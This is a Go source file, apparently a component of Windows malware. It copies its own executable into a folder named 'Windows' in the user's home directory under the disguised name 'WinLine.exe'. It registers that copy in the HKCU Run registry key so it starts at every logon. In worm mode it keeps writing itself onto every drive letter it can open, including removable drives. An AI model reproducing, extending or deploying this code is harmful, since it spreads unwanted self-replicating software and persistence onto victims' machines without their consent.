package initstart

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/user"
	"path/filepath"
	"time"

	"../../controller"

	"golang.org/x/sys/windows/registry"
)

type InitStart struct {
	Worm       bool
	RepeatDisk bool
	FileName   string
}

func New(control *controller.Controller) *InitStart {
	a := &InitStart{false, false, "WinLine.exe"}
	return a
}

func Loop(sc *InitStart, data []byte, home, mainp string) {
	fstime := true
	copied := make(map[string]bool)
	fmt.Println("HELLO")
	for {
		for _, drive := range "ABCDEFGHIJKLMNOPQRSTUVWXYZ" {
			maydisk := string(drive) + ":\\"
			val, ok := copied[maydisk]
			fll := !val || !ok || sc.RepeatDisk
			if fll {
				time.Sleep(time.Millisecond * 100)
				_, err := os.Open(maydisk)
				fmt.Println(maydisk)
				if err == nil {
					path := maydisk
					if maydisk == filepath.VolumeName(home)+"\\" {
						path = mainp
					}
					file := filepath.Join(path, sc.FileName)
					if _, e := os.Stat(file); os.IsNotExist(e) {
						f, e := os.Create(file)
						if e == nil && (path == mainp || sc.Worm) {
							_, err = f.Write(data)
							if err == nil {
								copied[maydisk] = true
								if f.Close() == nil && path == mainp && fstime {
									k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
									if err == nil {
										k.SetStringValue(sc.FileName, file)
										k.Close()
									}
								}
							} else {
								copied[maydisk] = false
							}
						}
					}
				}
			}
		}
		if sc.Worm {
			fstime = false
		} else {
			break
		}
	}
}

func (sc *InitStart) Start() {
	u, err := user.Current()
	exd := os.Args[0]
	if err == nil {
		source, err := os.Open(exd)
		if err == nil {
			bt, err := ioutil.ReadAll(source)
			if err == nil {
				mainp := filepath.Join(u.HomeDir, "Windows")
				if _, e := os.Stat(mainp); os.IsNotExist(e) {
					os.Mkdir(mainp, os.ModePerm)
				}
				go Loop(sc, bt, u.HomeDir, mainp)
			}
		}
		source.Close()
	}
}
